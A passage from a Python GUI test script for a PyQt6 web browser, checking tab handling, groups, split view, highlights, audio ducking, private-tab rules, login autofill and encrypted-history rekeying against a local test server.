    B.QApplication.instance().aboutToQuit.disconnect(_w2_99._save_groups)
except (TypeError, RuntimeError):
    pass
_w2_99._session_timer.stop()
try:
    _w2_99.close()
except RuntimeError:
    pass
H.spin(400)
check("closing the window that writes the session hands the job to another",
      _handed99, str(_handed99))

# ===== fourth pass, part 6: restart env, Settings gamepad switch =========
_env100 = {k: B.os.environ.get(k) for k in (B._GPU_MARK, "BROWSER_GPU_CARD")}
B.os.environ[B._GPU_MARK] = "1"
B.os.environ["BROWSER_GPU_CARD"] = "card1"
_sd100 = []
_real_sd100 = B.QProcess.startDetached
_real_quit100 = B.QApplication.instance().quit
B.QProcess.startDetached = staticmethod(lambda *a, **k: _sd100.append(
    (B.os.environ.get(B._GPU_MARK), B.os.environ.get("BROWSER_GPU_CARD"))) or True)
B.QApplication.instance().quit = lambda: None
try:
    br.restart()
finally:
    B.QProcess.startDetached = _real_sd100
    B.QApplication.instance().quit = _real_quit100
    for _k, _v in _env100.items():
        if _v is None:
            B.os.environ.pop(_k, None)
        else:
            B.os.environ[_k] = _v
    B.os.environ.pop("BROWSER_RESTART_WAIT", None)
check("a restart lets the next run choose the graphics card again",
      _sd100 == [(None, None)], str(_sd100))
_gp100 = br.config.get("gamepadOn", False)
br.bridge.setSetting("gamepadOn", "true")
_on100 = getattr(br, "_pad_timer", None) is not None and br._pad_timer.isActive()
br.bridge.setSetting("gamepadOn", "false")
_off100 = getattr(br, "_pad_timer", None) is None \
    or not br._pad_timer.isActive()
br.config["gamepadOn"] = _gp100
check("the Settings gamepad switch starts and stops the tab poll",
      _on100 and _off100, str((_on100, _off100)))

# ===== fourth pass, part 7: tab moves and site-wide tab actions ==========
_sess101 = list(br.sessions)
if not any(e.get("sid") == "rv101" for e in br.sessions):
    br.sessions.append({"name": "Review 101", "sid": "rv101"})
_r101 = br.open_tab_state([{"u": srv.url("/twhome"), "s": "rv101",
                            "t": "Home 101"}], lazy=False)
H.spin(400)
_mv101 = _r101[0] if _r101 else None
_win101 = None
_got101 = None
if _mv101 is not None:
    _mv101.locked = True
    _mv101.tab_name = "Named 101"
    _win101 = br.move_tab_to_window(br.tabs.indexOf(_mv101))
    H.spin(900)
    if _win101 is not None:
        _rows101 = [w for _i, w in _win101._real_tabs()]
        _got101 = [(getattr(w, "session", None),
                    bool(getattr(w, "locked", False)),
                    getattr(w, "tab_name", None)) for w in _rows101]
        for w in _rows101:
            w.locked = False
check("a tab moved to its own window keeps its browser, lock and name",
      _got101 == [("rv101", True, "Named 101")], str(_got101))
try:
    if _win101 is not None:
        _win101.close()
except RuntimeError:
    pass
H.spin(400)
_a101 = br.new_tab(url=srv.url("/twhome"), switch=False); H.spin(200)
_b101 = br.new_tab(url=srv.url("/twhome?x=1"), switch=False); H.spin(200)
_c101 = br.new_tab(url=srv.url("/twhome?x=2"), switch=False,
                   session="rv101"); H.spin(200)
_d101 = br.new_tab(url=srv.url("/twhome?x=3"), switch=False); H.spin(200)
_p101 = br.new_tab(url=srv.url("/twhome?x=4"), switch=False,
                   private=True); H.spin(200)
H.wait_for(lambda: all("/twhome" in w.url().toString()
                       for w in (_a101, _b101, _c101, _d101, _p101)), 8000)
_d101.locked = True
_guard101 = br.new_tab(switch=False); H.spin(200)   # keeps the window up
_gone101 = br.close_site_tabs(br.tabs.indexOf(_a101))
H.spin(300)
def _in_strip101(w):
    try:
        return br.tabs.indexOf(w) >= 0
    except RuntimeError:
        return False          # closed and already deleted
_left101 = [_in_strip101(w) for w in (_a101, _b101, _c101, _d101, _p101)]
check("closing a site's tabs leaves other browsers', locked and private ones",
      _left101 == [False, False, True, True, True], str(_left101))
try:
    _d101.locked = False
except RuntimeError:
    pass
for w in (_c101, _d101, _p101, _guard101):
    if _in_strip101(w):
        br.close_tab(br.tabs.indexOf(w), ask=False)
H.spin(300)
_e101 = br.new_tab(url=srv.url("/twhome?x=5"), switch=False); H.spin(200)
_f101 = br.new_tab(url=srv.url("/twhome?x=6"), switch=False); H.spin(200)
_g101 = br.new_tab(url=srv.url("/twhome?x=7"), switch=False,
                   private=True); H.spin(200)
_h101 = br.new_tab(url=srv.url("/twhome?x=8"), switch=False,
                   session="rv101"); H.spin(200)
H.wait_for(lambda: all("/twhome" in w.url().toString()
                       for w in (_e101, _f101, _g101, _h101)), 8000)
_host101 = _e101.url().host()
_name101 = br.stack_site_tabs(host=_host101, on=False)
H.spin(300)
_grp101 = [br._group_of(w) for w in (_e101, _f101, _g101, _h101)]
check("folding a site's tabs leaves private and other-browser tabs out",
      _grp101[0] == _grp101[1] == _name101 and _grp101[2] != _name101
      and _grp101[3] != _name101, str((_name101, _grp101)))
for w in (_e101, _f101, _g101, _h101):
    _close_if_open(w)
H.spin(300)
if _name101 and br._header_index(_name101) is not None:
    try:
        br.ungroup(_name101)
    except Exception:
        pass
br.sessions[:] = _sess101

# ===== fourth pass, part 8: pop-out return, fills, reader, typed lines ====
import os
_sess102 = list(br.sessions)
if not any(e.get("sid") == "rv102" for e in br.sessions):
    br.sessions.append({"name": "Review 102", "sid": "rv102"})
_pg102 = br.new_tab(url=srv.url("/twhome?pg=1"), switch=True); H.spin(300)
br._register_group("Pop102", "#89b4fa")
br._move_tab_to_group(br.tabs.indexOf(_pg102), "Pop102")
_keep102 = br.new_tab(url=srv.url("/twhome?pg=2"), switch=False,
                      group="Pop102"); H.spin(300)
_mini102 = br.pop_out_tab(br.tabs.indexOf(_pg102)); H.spin(300)
br.ungroup("Pop102"); H.spin(100)
_err102 = ""
try:
    if _mini102 is not None:
        _mini102.close()
    H.spin(300)
except Exception as _e:
    _err102 = repr(_e)
_back102 = br.tabs.indexOf(_pg102) >= 0
_grp102 = getattr(_pg102, "group", "x") if _back102 else "gone"
check("a popped-out tab whose group was removed comes back loose",
      _mini102 is not None and _back102 and _grp102 is None and not _err102,
      str((_mini102 is not None, _back102, _grp102, _err102)))
check("a removed group leaves no browser or id behind",
      "Pop102" not in br.group_sessions and "Pop102" not in br.group_ids,
      str((br.group_sessions.get("Pop102"), br.group_ids.get("Pop102"))))
for w in (_pg102, _keep102):
    _close_if_open(w)
H.spin(200)
if br.vault is not None and not br.vault_locked():
    _fv102 = br.new_tab(url=srv.url("/twhome?fill=1"), switch=False)
    H.wait_for(lambda: "/twhome" in _fv102.url().toString(), 8000)
    _vpw102 = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
    br.config[B.VAULT_PASSWORD_KEY] = True
    _ok102 = br.fill_login_now(view=_fv102, entry={
        "id": "not-for-this-site-102", "username": "u102",
        "password": "p102"})
    if _vpw102 == "__absent__":
        br.config.pop(B.VAULT_PASSWORD_KEY, None)
    else:
        br.config[B.VAULT_PASSWORD_KEY] = _vpw102
    br.close_tab(br.tabs.indexOf(_fv102), ask=False)
    check("a login chosen for another site is not filled into this one",
          _ok102 is False, str(_ok102))
_hl102 = br.config.get("highlights", "__absent__")
br.config["highlights"] = {"https://a.example/": ["old a1", "old a2"],
                           "https://b.example/": ["new b"]}
_all102 = [r["text"] for r in br.all_highlights()]
if _hl102 == "__absent__":
    br.config.pop("highlights", None)
else:
    br.config["highlights"] = _hl102
check("the highlight library lists the newest first",
      _all102 == ["new b", "old a2", "old a1"], str(_all102))
_np102 = br.new_tab(url=srv.url("/twhome?np=1"), switch=False)
H.wait_for(lambda: "/twhome" in _np102.url().toString(), 8000)
_np102.setHtml(
    '<p><a href="/twhome?wrong=1">Weiterlesen</a> '
    '<a href="/twhome?wrong=2">Next</a> in the header</p>'
    '<a rel="nofollow next" href="/twhome?page=2">2</a>',
    B.QUrl(srv.url("/twhome?np=1")))
H.spin(600)
_nx102 = {}
br.read_page_tool("nextpage", view=_np102,
                  then=lambda r: _nx102.update(v=r))
H.wait_for(lambda: "v" in _nx102, 5000)
br.close_tab(br.tabs.indexOf(_np102), ask=False)
check("the reader's next page is the page's own rel=next link",
      str(_nx102.get("v") or "").endswith("/twhome?page=2"), str(_nx102))
_rt102 = (br._resolve_typed("mailto:me@site.example"),
          br._resolve_typed("about:blank"))
check("mailto: and about: typed are opened, not mangled or searched",
      _rt102 == ("mailto:me@site.example", "about:blank"), str(_rt102))
check("a launch flag is never taken as the address",
      B._launch_url("-platform") is None
      and B._launch_url("--remote-debugging-port=9") is None)
_asked102 = []
_saved102 = (B.gpu_cards, B._gpu_config, B._gpu_ask_window,
             os.environ.get("QT_QPA_PLATFORM"))
B.gpu_cards = lambda: [{"id": "a"}, {"id": "b"}]
B._gpu_config = lambda: {"gpuAsk": True}
B._gpu_ask_window = lambda *a, **k: _asked102.append(1)
os.environ["QT_QPA_PLATFORM"] = "offscreen"
_mark102 = os.environ.pop(B._GPU_MARK, None)
try:
    B._gpu_startup()
finally:
    B.gpu_cards, B._gpu_config, B._gpu_ask_window = _saved102[:3]
    if _saved102[3] is None:
        os.environ.pop("QT_QPA_PLATFORM", None)
    else:
        os.environ["QT_QPA_PLATFORM"] = _saved102[3]
    if _mark102 is not None:
        os.environ[B._GPU_MARK] = _mark102
check("a headless start never puts up the card chooser",
      _asked102 == [], str(_asked102))
_pos102 = (br.config.get("newTabPos", "__absent__"))
br.config["newTabPos"] = "after"
_pa102 = br.new_tab(url=srv.url("/twhome?pin=1"), switch=False); H.spin(200)
_pb102 = br.new_tab(url=srv.url("/twhome?pin=2"), switch=False); H.spin(200)
br.pin_tab(br.tabs.indexOf(_pa102), True)
br.pin_tab(br.tabs.indexOf(_pb102), True)
H.spin(200)
br.tabs.setCurrentIndex(br.tabs.indexOf(_pa102)); H.spin(100)
_pc102 = br.new_tab(url=srv.url("/twhome?pin=3"), switch=False); H.spin(200)
_ia102, _ib102, _ic102 = (br.tabs.indexOf(_pa102), br.tabs.indexOf(_pb102),
                          br.tabs.indexOf(_pc102))
if _pos102 == "__absent__":
    br.config.pop("newTabPos", None)
else:
    br.config["newTabPos"] = _pos102
check("a tab opened after a pinned tab lands after the pinned block",
      _ic102 > max(_ia102, _ib102), str((_ia102, _ib102, _ic102)))
for w in (_pa102, _pb102):
    try:
        if br.tabs.indexOf(w) >= 0:
            br.pin_tab(br.tabs.indexOf(w), False)
    except RuntimeError:
        pass          # closed and deleted on the way
for w in (_pa102, _pb102, _pc102):
    _close_if_open(w)
H.spin(200)
_cy102 = br.new_tab(url=srv.url("/twhome?cy=1"), switch=True); H.spin(200)
_cz102 = br.new_tab(url=srv.url("/twhome?cy=2"), switch=False,
                    session="rv102"); H.spin(200)
_seen102 = set()
for _k in range(6):
    br.cycle_group_tabs(1); H.spin(50)
    _cur = br.current()
    _seen102.add(getattr(_cur, "session", "main"))
check("Ctrl+Alt+Tab on a loose tab stays in this virtual browser",
      "rv102" not in _seen102, str(_seen102))
br.switch_session("main")
for w in (_cy102, _cz102):
    _close_if_open(w)
H.spin(200)
_sets102 = json.dumps(br.config.get("tabSets") or {})
_ts102 = br.new_tab(url=srv.url("/twhome?set=1"), switch=False); H.spin(300)
H.wait_for(lambda: "/twhome" in _ts102.url().toString(), 8000)
br.save_tabset("Review102")
_pt102 = br.new_tab(url=srv.url("/twhome?set=priv"), switch=False,
                    private=True); H.spin(300)
_new102 = br.restore_tabset("Review102", replace=True); H.spin(400)
_priv_alive102 = br.tabs.indexOf(_pt102) >= 0
for w in list(_new102) + [_pt102, _ts102]:
    _close_if_open(w)
br.config["tabSets"] = json.loads(_sets102)
check("switching tab sets leaves the private tabs open",
      _priv_alive102, str(_priv_alive102))
H.spin(200)
_lg102 = br.new_tab(url=srv.url("/twhome?lock=1"), switch=False); H.spin(300)
H.wait_for(lambda: "/twhome" in _lg102.url().toString(), 8000)
br._register_group("Lock102", "#a6e3a1")
br._move_tab_to_group(br.tabs.indexOf(_lg102), "Lock102")
_lg102.locked = True
_lg102.tab_name = "Kept 102"
br._save_groups(quiet=True)
_saved_rows102 = [r for g in br.config.get("tabGroups", [])
                  if g.get("name") == "Lock102" for r in g.get("urls", [])]
_lg102.locked = False
br.close_tab(br.tabs.indexOf(_lg102), ask=False)
H.spin(200)
check("a grouped tab's lock and name are saved with the group",
      any(r.get("l") and r.get("n") == "Kept 102" for r in _saved_rows102),
      str(_saved_rows102))
br.sessions[:] = _sess102

# ===== fourth pass, part 9: highlights, ducking, split, cookies, fonts ===
_hv103 = br.new_tab(url=srv.url("/twhome?hl=1"), switch=True)
H.wait_for(lambda: "/twhome" in _hv103.url().toString(), 8000)
_hv103.setHtml("<p id=p>the end and the end</p>",
               B.QUrl(srv.url("/twhome?hl=1")))
H.wait_for(lambda: jsq(_hv103, "!!document.getElementById('p')") is True,
           5000)
H.js(_hv103, "var t=document.getElementById('p').firstChild;"
     "var r=document.createRange();r.setStart(t,12);r.setEnd(t,19);"
     "var s=getSelection();s.removeAllRanges();s.addRange(r);true")
_hls103 = br.config.get("highlights", "__absent__")
br.add_highlight(_hv103)
H.wait_for(lambda: jsq(_hv103, "document.querySelectorAll('mark.__hl')"
                               ".length") == 1, 5000)
_first103 = jsq(_hv103, "document.getElementById('p').firstChild.nodeValue")
if _hls103 == "__absent__":
    br.config.pop("highlights", None)
else:
    br.config["highlights"] = _hls103
check("a highlight marks the occurrence he selected, not the first one",
      _first103 == "the end and ", str(_first103))
br.close_tab(br.tabs.indexOf(_hv103), ask=False)
H.spin(200)
_dk103 = []
_real_mt103 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: (
    _dk103.append((name, view, arg)) or True)
_duck_was103 = br.config.get("duckLevel", "__absent__")
br.config["duckLevel"] = 0.2
_fr103 = br.new_tab(url=srv.url("/twhome?duck=1"), switch=True); H.spin(200)
_bg103 = br.new_tab(url=srv.url("/twhome?duck=2"), switch=False); H.spin(200)
try:
    _bg103.page().recentlyAudible = lambda: True
    br.duck_others(_fr103)
    _ducked103 = [(n, a) for n, v, a in _dk103 if v is _bg103]
    del _dk103[:]
    br._audible_changed(_fr103, False)
    _back103 = [(n, a) for n, v, a in _dk103 if v is _bg103]
finally:
    br.media_tool2 = _real_mt103
    if _duck_was103 == "__absent__":
        br.config.pop("duckLevel", None)
    else:
        br.config["duckLevel"] = _duck_was103
check("a ducked tab gets its volume back when the front tab goes quiet",
      _ducked103 == [("duck", 0.2)] and _back103 == [("duck", None)],
      str((_ducked103, _back103)))
for w in (_fr103, _bg103):
    _close_if_open(w)
H.spin(200)
_pw103 = br.config.get("panelWidth", "__absent__")
_sa103 = br.new_tab(url=srv.url("/twhome?split=1"), switch=True); H.spin(300)
_sb103 = br.new_tab(url=srv.url("/twhome?split=2"), switch=False); H.spin(300)
br.split_view(index=br.tabs.indexOf(_sb103), on=True); H.spin(300)
br.toggle_panel(True); H.spin(300)


def _size103(w):
    at = br._split.indexOf(w)
    sizes = br._split.sizes()
    return sizes[at] if 0 <= at < len(sizes) else 0


_sizes103 = (_size103(br.tabs), _size103(br._splitview), _size103(br._panel))
_sz103 = br._split.sizes()
_pi103 = br._split.indexOf(br._panel)
if 0 <= _pi103 < len(_sz103):
    _sz103[_pi103] = 333
    br._split.setSizes(_sz103)
H.spin(100)
_want103 = _size103(br._panel)
br.toggle_panel(False); H.spin(200)
_saved103 = br.config.get("panelWidth")
check("with a split view up the panel opens beside both halves",
      all(s > 50 for s in _sizes103), str(_sizes103))
check("...and its width is still remembered when it closes",
      _saved103 == _want103 and _want103 > 80, str((_saved103, _want103)))
_tr103 = []
_real_tn103 = br.translate_page_now
br.translate_page_now = lambda view=None, lang=None: _tr103.append(view)
try:
    br.translate_side_by_side(view=_sa103)
    H.spin(400)
    _still103 = br.split_showing()
    _new103 = br._split_view
finally:
    br.translate_page_now = _real_tn103
check("translating side by side with a split up makes a new split",
      _still103 and _new103 is not None and _new103 is not _sb103,
      str((_still103, _new103 is _sb103)))
br.close_split(); H.spin(200)
for w in (_sa103, _sb103, _new103):
    try:
        if w is not None:
            _close_if_open(w)
    except RuntimeError:
        pass
if _pw103 == "__absent__":
    br.config.pop("panelWidth", None)
else:
    br.config["panelWidth"] = _pw103
H.spin(200)
_strip103 = br.config.get("stripTracking", "__absent__")
br.config["stripTracking"] = True
_fs103 = br.new_tab(url=srv.url("/twhome?form=1"), switch=False)
H.wait_for(lambda: "/twhome" in _fs103.url().toString(), 8000)
_st103 = []
_real_ps103 = br.privacy_stripped
br.privacy_stripped = lambda: _st103.append(1)
NT103 = B.QWebEnginePage.NavigationType
try:
    _fs103.page().acceptNavigationRequest(
        B.QUrl(srv.url("/twhome?utm_source=x&a=1")),
        NT103.NavigationTypeFormSubmitted, True)
    _form103 = len(_st103)
    _fs103.page().acceptNavigationRequest(
        B.QUrl(srv.url("/twhome?utm_source=x&a=2")),
        NT103.NavigationTypeLinkClicked, True)
    _link103 = len(_st103) - _form103
finally:
    br.privacy_stripped = _real_ps103
    if _strip103 == "__absent__":
        br.config.pop("stripTracking", None)
    else:
        br.config["stripTracking"] = _strip103
H.spin(300)
br.close_tab(br.tabs.indexOf(_fs103), ask=False)
check("a submitted form is not re-sent as a GET to strip its address",
      _form103 == 0 and _link103 == 1, str((_form103, _link103)))
try:
    _cm103 = br.cookie_menu(host="private103.example", private=True)
    _cm_on103 = [a.isEnabled() for a in _cm103.actions() if a.isCheckable()]
except TypeError:
    _cm_on103 = [True]
check("no cookie rule can be set from a private tab",
      _cm_on103 and not any(_cm_on103), str(_cm_on103))
_prof103 = br.profile if hasattr(br, "profile") else None
_fonts103 = json.dumps(br.config.get("siteFonts") or {})
_set103 = B.QWebEngineProfile.defaultProfile().settings() \
    if _prof103 is None else _prof103.settings()
_F103 = B.QWebEngineSettings.FontFamily.SansSerifFont
_before103 = _set103.fontFamily(_F103)
br.config["siteFonts"] = {"sans": "Review103 Sans"}
br.apply_site_fonts()
_mid103 = _set103.fontFamily(_F103)
br.config["siteFonts"] = {}
br.apply_site_fonts()
_after103 = _set103.fontFamily(_F103)
br.config["siteFonts"] = json.loads(_fonts103)
br.apply_site_fonts()
check("an emptied site-font box puts the engine's font back",
      _mid103 == "Review103 Sans" and _after103 == _before103,
      str((_before103, _mid103, _after103)))
_pe103 = br.config.get("privateEngine", "__absent__")
_se103 = br.config.get("searchEngine", "__absent__")
br.config["privateEngine"] = "duckduckgo"
br.config["searchEngine"] = "google"
_pv103 = br.new_tab(private=True, switch=False); H.spin(300)
try:
    _ps103 = br._private_start_search(
        B.QUrl("https://www.google.com/search?q=hello+review"), _pv103)
except AttributeError:
    _ps103 = None
for _k, _v in (("privateEngine", _pe103), ("searchEngine", _se103)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.close_tab(br.tabs.indexOf(_pv103), ask=False)
check("a private tab's start-page search goes to the private engine",
      _ps103 is not None
      and _ps103.toString().startswith("https://duckduckgo.com/")
      and "review" in _ps103.toString(), str(_ps103))
_pwsrc103 = (_Path(B.__file__).parent / "passwords.html").read_text()
check("the password search looks at values and a failed export says so",
      'searchText(it, "")' in _pwsrc103 and "d.error" in _pwsrc103
      and 'dispatchEvent(new Event("input"' in _pwsrc103)
_sp103 = (_Path(B.__file__).parent / "start.html").read_text()
check("the start page takes the shared quick links and stops a slideshow",
      "if (data.setupDone) {" in _sp103 and "window.__wallShown" in _sp103)
H.spin(200)

# ===== fourth pass, part 10: a quiet save of a shown setting ==============
br.save_config(quiet=True)
_r104 = B._page_data_rev
br.save_config(quiet=True)
_same104 = B._page_data_rev == _r104
br.config["sessionTabs"] = dict(br.config.get("sessionTabs") or {},
                                rv104=[])
br.save_config(quiet=True)
_timer104 = B._page_data_rev == _r104
(br.config.get("sessionTabs") or {}).pop("rv104", None)
br.save_config(quiet=True)
_r104 = B._page_data_rev
_sb104 = br.config.get("scrollbars", "__absent__")
br.config["scrollbars"] = "review104"
br.save_config(quiet=True)
_bumped104 = B._page_data_rev > _r104
if _sb104 == "__absent__":
    br.config.pop("scrollbars", None)
else:
    br.config["scrollbars"] = _sb104
br.save_config(quiet=True)
check("a quiet save of a setting Settings shows marks the pane stale",
      _bumped104 and _same104 and _timer104,
      str((_bumped104, _same104, _timer104)))

# ===== review of the fourth pass: split save, export, reader, duck, heir ==
_sx105 = br.new_tab(url=srv.url("/twhome?sp=1"), switch=True); H.spin(300)
_sy105 = br.new_tab(switch=False); H.spin(400)          # a start page
br.split_view(index=br.tabs.indexOf(_sy105), on=True); H.spin(300)
br._save_groups(quiet=True)
_rows105 = [r.get("u", "") for rows in
            (br.config.get("sessionTabs") or {}).values() for r in rows]
_start105 = [u for u in _rows105 if B._same_page(B.QUrl(u), B.START_PAGE)]
br.close_split(); H.spin(200)
check("a start page in the split view is not saved as a tab",
      not _start105, str(_start105))
_sg105 = br.new_tab(url=srv.url("/twhome?sg=1"), switch=False); H.spin(300)
H.wait_for(lambda: "/twhome" in _sg105.url().toString(), 8000)
br._register_group("Split105", "#f9e2af")
br._move_tab_to_group(br.tabs.indexOf(_sg105), "Split105")
_sh105 = br.new_tab(url=srv.url("/twhome?sg=2"), switch=False,
                    group="Split105"); H.spin(300)
br.tabs.setCurrentIndex(br.tabs.indexOf(_sx105)); H.spin(100)
br.split_view(index=br.tabs.indexOf(_sg105), on=True); H.spin(300)
br._save_groups(quiet=True)
_gu105 = [r.get("u", "") for g in br.config.get("tabGroups", [])
          if g.get("name") == "Split105" for r in g.get("urls", [])]
br.close_split(); H.spin(200)
check("a grouped tab in the split view is saved with its group",
      any("sg=1" in u for u in _gu105), str(_gu105))
for w in (_sx105, _sy105, _sg105, _sh105):
    _close_if_open(w)
H.spin(200)
check("a group whose last tab closes forgets its browser and id",
      "Split105" not in br.group_sessions and "Split105" not in br.group_ids,
      str((br.group_sessions.get("Split105"), br.group_ids.get("Split105"))))
_hl105 = br.config.get("highlights", "__absent__")
br.config["highlights"] = {"https://a105.example/": ["first", "second",
                                                     "third"]}
_xp105 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "h.md"
br.export_highlights(path=str(_xp105))
_md105 = _xp105.read_text() if _xp105.exists() else ""
if _hl105 == "__absent__":
    br.config.pop("highlights", None)
else:
    br.config["highlights"] = _hl105
check("the highlight export keeps a page's highlights in the order marked",
      0 <= _md105.find("first") < _md105.find("second") < _md105.find("third"),
      _md105[-80:])
_rn105 = br.new_tab(url=srv.url("/twhome?rn=1"), switch=False)
H.wait_for(lambda: "/twhome" in _rn105.url().toString(), 8000)
_real_rpt105 = br.read_page_tool
br.read_page_tool = lambda name, view=None, then=None, arg=None: (
    then(srv.url("/twhome?rn=2")) or True)
_rn105.load = lambda u: None
_rc0 = _rn105.receivers(_rn105.loadFinished)
try:
    br.reader_next_page(view=_rn105)
    br.reader_next_page(view=_rn105)
    _rc1 = _rn105.receivers(_rn105.loadFinished)
finally:
    br.read_page_tool = _real_rpt105
    try:
        _rn105.loadFinished.disconnect(_rn105._reader_landed)
    except Exception:
        pass
    _rn105.__dict__.pop("load", None)
br.close_tab(br.tabs.indexOf(_rn105), ask=False)
check("next page pressed twice leaves one waiter for the reader",
      _rc1 - _rc0 == 1, str((_rc0, _rc1)))
_dk105 = []
_real_mt105 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: (
    _dk105.append((name, view, arg)) or True)
_dl105 = br.config.get("duckLevel", "__absent__")
br.config["duckLevel"] = 0.3
_da105 = br.new_tab(url=srv.url("/twhome?da=1"), switch=False); H.spin(200)
_db105 = br.new_tab(url=srv.url("/twhome?da=2"), switch=True); H.spin(200)
br._ducked, br._ducked_by = [_db105], _da105
try:
    br.duck_others(_db105)
finally:
    br.media_tool2 = _real_mt105
    if _dl105 == "__absent__":
        br.config.pop("duckLevel", None)
    else:
        br.config["duckLevel"] = _dl105
_own105 = [a for n, v, a in _dk105 if v is _db105]
check("a ducked tab that starts playing in front gets its volume back",
      _own105 == [None] and _db105 not in (br._ducked or []),
      str((_own105, len(br._ducked or []))))
br._ducked, br._ducked_by = [], None
for w in (_da105, _db105):
    _close_if_open(w)
H.spin(200)
_w2_105 = br.new_window(); H.spin(800)
_w3_105 = br.new_private_window(); H.spin(800)
_w2_105._session_timer.start()
_w2_105.close(); H.spin(600)
_w3_writes105 = _w3_105._session_timer.isActive()
_br_writes105 = br._session_timer.isActive()
try:
    _w3_105.close()
except RuntimeError:
    pass
H.spin(600)
check("closing the session-writing window never hands it to a private one",
      not _w3_writes105 and _br_writes105,
      str((_w3_writes105, _br_writes105)))
_pwh105 = (_Path(B.__file__).parent / "passwords.html").read_text()
check("the two-factor code is asked for at once, not a second later",
      "tick(true);" in _pwh105)

# ===== fifth/sixth pass, part 1: lock, recording, settings, vault, keys ===
_ep106 = None
if B.HAVE_ENGINE_PANE:
    _cov106 = getattr(br, "_lock_cover", None)
    br._lock_cover = object()
    try:
        for _sc in br.findChildren(B.QShortcut):
            if _sc.key().toString() == "Ctrl+Shift+E":
                _sc.activated.emit()
        H.spin(300)
        _ep106 = getattr(br, "_engine_pane", None)
        _ep_up106 = bool(_ep106 is not None and _ep106.isVisible())
    finally:
        br._lock_cover = _cov106
    check("the engine pane does not open behind the window lock",
          not _ep_up106, str(_ep_up106))
_rc106 = br.config.get("recordClicks", "__absent__")
br.config["recordClicks"] = True
_rt106 = br.new_tab(url=srv.url("/twhome?rec=1"), switch=True)
H.wait_for(lambda: "/twhome" in _rt106.url().toString(), 8000)
H.spin(300)
_err106 = ""
try:
    br.start_recording(view=_rt106, fps=4)
    H.spin(700)
    br.close_tab(br.tabs.indexOf(_rt106), ask=False)
    H.spin(800)
except Exception as _e:
    _err106 = repr(_e)
_still106 = br.recording_now() is not None
if _still106:
    br.stop_recording(save=False)
if _rc106 == "__absent__":
    br.config.pop("recordClicks", None)
else:
    br.config["recordClicks"] = _rc106
check("closing the recorded tab ends the recording cleanly",
      not _still106 and not _err106, str((_still106, _err106)))
_gs106 = json.loads(br.bridge.getSettings())
check("Settings is sent the appearance values it shows",
      all(k in _gs106 for k in ("warmNight", "autoHideChrome", "uiFont",
                                "siteFonts", "darkSiteRules",
                                "noUiAnimation", "scrollbars")),
      str([k for k in ("warmNight", "siteFonts", "noUiAnimation")
           if k not in _gs106]))
_dl106 = br.config.get("duckLevel", "__absent__")
br.config["duckLevel"] = 0
_dt106 = br.new_tab(url=srv.url("/twhome?d0=1"), switch=False); H.spin(200)
_dt106.page().recentlyAudible = lambda: True
_dn106 = br.duck_others(br.current())
if _dl106 == "__absent__":
    br.config.pop("duckLevel", None)
else:
    br.config["duckLevel"] = _dl106
br.close_tab(br.tabs.indexOf(_dt106), ask=False)
check("a duck level of 0 is off, not mute", _dn106 == 0, str(_dn106))
_he106 = br.config.get("historyEncrypted", "__absent__")
_mk106 = []
_real_mk106 = br.media_keys
br.media_keys = lambda on=None: _mk106.append(on) or bool(on)
try:
    if br.history_key() is None:
        br.bridge.setSetting("historyEncrypted", "true")
        _hon106 = br.config.get("historyEncrypted")
    else:
        _hon106 = False
    br.bridge.setSetting("mprisOn", "true")
finally:
    br.media_keys = _real_mk106
if _he106 == "__absent__":
    br.config.pop("historyEncrypted", None)
else:
    br.config["historyEncrypted"] = _he106
br.save_config(quiet=True)
check("history encryption from Settings is refused without a vault key",
      _hon106 is False, str(_hon106))
check("the media-keys switch in Settings starts the service",
      _mk106 == [True], str(_mk106))


class _FakeLock106:
    def __init__(self, new, old=None):
        self.new, self.old = new, old

    def derived_key(self, label):
        return B.hmac.new(self.new, b"derived:" + label.encode(),
                          B.hashlib.sha256).digest()

    def take_replaced_key(self):
        old, self.old = self.old, None
        return old


_hf_real106 = B.HISTORY_FILE
_hdir106 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
B.HISTORY_FILE = _hdir106 / "history.json"
_lock_real106 = br.vault_lock
_hist_real106 = list(br.history)
_flags106 = (getattr(br, "_history_locked", False),
             getattr(br, "_history_unsaved", False))
_old106, _new106 = b"o" * 32, b"n" * 32
_okey106 = B.hmac.new(_old106, b"derived:history", B.hashlib.sha256).digest()
B.HISTORY_FILE.write_bytes(B.HISTORY_MAGIC + B._seal(
    _okey106, json.dumps([{"url": "https://old106.example/"}]).encode(),
    aad=B.HISTORY_MAGIC))
try:
    br.config["historyEncrypted"] = True
    br.vault_lock = _FakeLock106(_new106, _old106)
    br._history_locked = True
    br.history[:] = [{"url": "https://new106.example/"}]
    try:
        br._rekey_history()
    except AttributeError:
        pass
    _nkey106 = br.vault_lock.derived_key("history")
    _raw106 = B.HISTORY_FILE.read_bytes()
    _plain106 = B._unseal(_nkey106, _raw106[len(B.HISTORY_MAGIC):],
                          aad=B.HISTORY_MAGIC)
    _rows106 = [r["url"] for r in json.loads(_plain106)] if _plain106 else []
    br._history_locked = False
    try:
        _was106 = br._history_out_of_vault()
    except AttributeError:
        _was106 = "missing"
    _after106 = B.HISTORY_FILE.read_bytes()
    _plain_ok106 = (not _after106.startswith(B.HISTORY_MAGIC)
                    and "old106" in _after106.decode("utf-8", "replace"))
finally:
    br.vault_lock = _lock_real106
    B.HISTORY_FILE = _hf_real106
    br.history[:] = _hist_real106
    br._history_locked, br._history_unsaved = _flags106
    if _he106 == "__absent__":
        br.config.pop("historyEncrypted", None)
    else:
        br.config["historyEncrypted"] = _he106
    br.save_config(quiet=True)
check("a new passphrase carries the encrypted history over",
      _rows106 == ["https://old106.example/", "https://new106.example/"],
      str(_rows106))
check("switching the master password off writes the history back readable",
      _was106 is True and _plain_ok106, str((_was106, _plain_ok106)))
_ks106 = br.config.get("keySequences", "__absent__")
br.config["keySequences"] = {"b": "bookmark"}
_ran106 = []
_real_ra106 = br.run_action
br.run_action = lambda a, *x, **k: _ran106.append(a)
_took106 = False
try:
    br.start_key_sequence()
    from PyQt6.QtGui import QKeyEvent as _QKE106
    _ev106 = _QKE106(B.QEvent.Type.KeyPress, B.Qt.Key.Key_B,
                     B.Qt.KeyboardModifier.NoModifier, "b")
    try:
